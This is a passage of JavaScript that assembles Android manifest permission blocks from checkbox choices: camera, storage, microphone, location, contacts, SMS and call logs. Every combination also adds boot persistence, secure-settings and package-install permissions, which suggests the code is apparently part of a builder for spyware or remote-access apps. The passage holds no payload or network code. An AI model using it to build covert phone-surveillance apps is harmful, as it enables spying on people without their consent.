            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         `
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>         `
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>            ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>  `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         
            ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         
            ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
